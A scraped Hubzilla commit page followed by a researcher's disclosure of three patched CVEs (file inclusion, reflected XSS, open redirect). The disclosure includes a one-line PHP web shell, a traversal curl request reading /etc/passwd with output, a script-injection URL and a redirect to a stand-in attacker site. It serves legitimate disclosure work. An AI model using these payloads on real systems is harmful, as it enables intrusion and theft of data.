=== Content from framagit.org_64ed8ec2_20250114_190145.html ===


[Skip to content](#content-body)
GitLab
[![](data:image/gif;base64...)](/ "Homepage")

* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Register](/users/sign_up)

**Commit
0784cd59**

authored
Mar 29, 2022
by
**[![Mario's avatar](/assets/no_avatar-849f9c04a3a0d0cea2424ae97b27447dc64a7dbfae83c036c45b403392f0e8ba.png "Mario")](/mario)
[Mario](/mario)**

[Browse files](/hubzilla/core/-/tree/0784cd593a39a4fc297e8a82f7e79bc8019a0868)

### Merge branch '7.2RC'

parents
[0e2e9321](/hubzilla/core/-/commit/0e2e9321025f87fe9587f3d183adaea6185e4e20)
[9c5d2ee5](/hubzilla/core/-/commit/9c5d2ee5630dd7033904039dcd1e92db8821b644)

Loading

Loading

Loading

Loading

* [Changes
  929](/hubzilla/core/-/commit/0784cd593a39a4fc297e8a82f7e79bc8019a0868)
* [Pipelines
  2](/hubzilla/core/-/commit/0784cd593a39a4fc297e8a82f7e79bc8019a0868/pipelines)

[Expand all](/hubzilla/core/-/commit/0784cd593a39a4fc297e8a82f7e79bc8019a0868?expanded=1)
[Hide whitespace changes](/hubzilla/core/-/commit/0784cd593a39a4fc297e8a82f7e79bc8019a0868?action=show&controller=projects%2Fcommit&id=0784cd593a39a4fc297e8a82f7e79bc8019a0868&namespace_id=hubzilla&project_id=core&w=1)
[Inline](/hubzilla/core/-/commit/0784cd593a39a4fc297e8a82f7e79bc8019a0868?view=inline)
[Side-by-side](/hubzilla/core/-/commit/0784cd593a39a4fc297e8a82f7e79bc8019a0868?view=parallel)

Loading

Preview

0%
Loading

Try again

or
attach a new file

.

Cancel

You are about to add
**0
people**
to the discussion. Proceed with caution.

Finish editing this message first!

Save comment

Cancel

Please [register](/users/sign_up?redirect_to_referer=yes) or [sign in](/users/sign_in?redirect_to_referer=yes) to comment



=== Content from volse.net_230d25e5_20250114_190146.html ===


* [Haralds Homepage](https://volse.net/~haraldei/)
* [Infosec stuff and resources](https://volse.net/~haraldei/infosec/)
* [Disclosures](https://volse.net/~haraldei/infosec/disclosures/)
# Hubzilla < 7.2 - Multiple vulnerabilities

Published: 2022-04-12
[disclosure](https://volse.net/~haraldei/tags/disclosure/) [hubzilla](https://volse.net/~haraldei/tags/hubzilla/) [infosec](https://volse.net/~haraldei/tags/infosec/)

While looking at the source code for [Hubzilla](https://zotlabs.org/page/hubzilla/hubzilla-project), I discovered a few low-hanging
security vulnerabilities. These are a [Local File Inclusion](https://owasp.org/www-community/vulnerabilities/PHP_File_Inclusion) vulnerability in the
standard theme, and two vulnerabilities in the settings modules, a
[Cross-Site scripting](https://owasp.org/www-community/attacks/xss/) (XSS) vulnerability and an [Open Redirect](https://brightsec.com/blog/open-redirect-vulnerabilities/) vulnerability,
both via the `rpath` URL query parameter.

Fixes for all of these issues were released in version 7.2 on March 29, 2022.

## CVE-2022-27257: Local file inclusion/Directory traversal in Redbasic theme for Hubzilla

The RedBasic theme does not validate the `$_REQUEST['schema']` argument before
using it in a `require_once` call, leading to a Local File Inclusion (LFI)
vulnerability. Further it does not check the filename for directory separators
or other special chars, leading to a [directory traversal](https://owasp.org/www-community/attacks/Path_Traversal) vulnerability.

This allows an attacker to directly run PHP code from any known location in the
file system where the web server process has read access. This includes files in
the Hubzilla source three that would otherwise be protected by the default server
configuration that redirects all requests to pass through the Hubzilla routing
logic.

### Details

* Application: Hubzilla
* Component: Redbasic (default/builtin theme)
* Vulnerable versions: Any version before 7.2
* Fixed in version: 7.2

### Classification

* CWE: [CWE-20](https://cwe.mitre.org/data/definitions/20.html), [CWE-22](https://cwe.mitre.org/data/definitions/22.html)
* CVSS Score: [8.3](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L) (High)
* CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L

### Relevant code:

```

| 1 | if($_REQUEST['schema']) { |
| --- | --- |
| 2 | $schema = $_REQUEST['schema']; |
| 3 | } |
| 4 |  |
| 5 | if (($schema) && ($schema != '---')) { |
| 6 |  |
| 7 | // Check it exists, because this setting gets distributed to clones |
| 8 | if(file_exists('view/theme/redbasic/schema/' . $schema . '.php')) { |
| 9 | $schemefile = 'view/theme/redbasic/schema/' . $schema . '.php'; |
| 10 | require_once ($schemefile); |
| 11 | } |
| 12 |  |
| 13 | if(file_exists('view/theme/redbasic/schema/' . $schema . '.css')) { |
| 14 | $schemecss = file_get_contents('view/theme/redbasic/schema/' . $schema . '.css'); |
| 15 | } |
| 16 |  |
| 17 | } |

```
### Proof of concept:

Given a file `shell.php` somewhere in the server file system:

```
<?php system($_REQUEST['cmd']); ?>

```

Any command can be executed by a remote, unauthenticated attacker, like this:

```
$ curl -s 'https://example.com/view/theme/redbasic/php/style.pcss?f=&puid=2&schema=../../../../shell&v=7.1.6&cmd=cat%20/etc/passwd'|head
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin

```
### Mitigating factors

As Hubzilla will rename uploaded files to a GUID, it's not trivially possible
to upload a malicious file to be exploited by this weakness by itself. It
requires another way to upload the malicious file, or by finding an existing
file that is exploitable within or outside of the Hubzilla directory tree.

---

## CVE-2022-27258: Reflected Cross-Site Scripting in Hubzilla settings modules

A number of settings modules does not sanitise or escape the `rpath` query
parameter before outputting it into an html attribute, leading to a reflected
Cross-Site Scripting (XSS) vulnerability.

An attacker could use this to inject arbitrary JavaScript into a victims' session
by enticing them to click a link.

### Details

* Application: Hubzilla
* Component: Settings modules
* Vulnerable versions: Any version before 7.2
* Fixed in version: 7.2

### Classification

* CWE: [CWE-79](https://cwe.mitre.org/data/definitions/79.html)
* CVSS Score: [7.4](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N) (High)
* CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N

### Relevant code

Example from `Zotlabs/Module/Settings/Calendar.php`:

```

| 32 | $rpath = (($_GET['rpath']) ? $_GET['rpath'] : ''); |
| --- | --- |
| 33 |  |
| 34 | $tpl = get_markup_template("settings_module.tpl"); |
| 35 |  |
| 36 | $o .= replace_macros($tpl, array( |
| 37 | '$rpath' => $rpath, |
| 38 | '$action_url' => 'settings/' . $module, |
| 39 | '$form_security_token' => get_form_security_token('settings_' . $module), |
| 40 | '$title' => t('Calendar Settings'), |
| 41 | '$features'  => process_module_features_get(local_channel(), $features), |
| 42 | '$submit'    => t('Submit') |
| 43 | )); |

```

The highlighted lines show how the query parameter `rpath` is passed directly
to the template `settings_module.tpl`:

```

| 8 | {{if $rpath}} |
| --- | --- |
| 9 | <input type='hidden' name='rpath' value='{{$rpath}}'> |
| 10 | {{/if}} |

```

Where it is used without further escaping in a html element attribute.

### Related source files:

* `Zotlabs/Module/Settings/Calendar.php`
* `Zotlabs/Module/Settings/Channel_home.php`
* `Zotlabs/Module/Settings/Connections.php`
* `Zotlabs/Module/Settings/Directory.php`
* `Zotlabs/Module/Settings/Editor.php`
* `Zotlabs/Module/Settings/Events.php`
* `Zotlabs/Module/Settings/Manage.php`
* `Zotlabs/Module/Settings/Network.php`
* `Zotlabs/Module/Settings/Photos.php`
* `Zotlabs/Module/Settings/Profiles.php`
* `View/tpl/settings_module.tpl`

### Proof of concept:

```
https://example.com/settings/calendar/?f=&rpath=https://example.com/cdav/calendar'><script>alert('boom')</script>

```

---

## CVE-2022-27256: Open Redirect in Hubzilla settings modules

When submitting a change in one of the affected settings modules above, the
`rpath` query parameter is is passed on as a POST parameter and used blindly to
redirect after submitting the form, leading to an open redirect vulnerability.

An attacker can use this to trick a victim to give them sensitive information
by first directing them to change a setting and then redirect to an attacker
controlled site after the victim submits the changes. For example by making
malicious site look like the Hubzilla login form and convincing the victim they
need to authenticate to save the changes.

### Details

* Application: Hubzilla
* Component: Settings modules
* Vulnerable versions: Any version before 7.2
* Fixed in version: 7.2

### Classification

* CWE: [CWE-601](https://cwe.mitre.org/data/definitions/601.html)
* CVSS Score: [4.7](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N) (Medium)
* CVSS Vector: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:N/A:N

### Relevant code:

Example from `Zotlabs/Module/Settings/Calendar.php`:

```

| 21 | if($_POST['rpath']) |
| --- | --- |
| 22 | goaway($_POST['rpath']); |

```

Here the POST parameter `rpath` is passed directly to the `goaway()` function,
that simply causes a redirect to the supplied URL without any further
checking.

### Proof of concept:

```
https://example.com/settings/calendar/?f=&rpath=https://evilsite.org/auth.php

```

Subscribe:
[![](https://volse.net/~haraldei/feed-icon.svg)
Atom/RSS](https://volse.net/~haraldei/atom.xml)


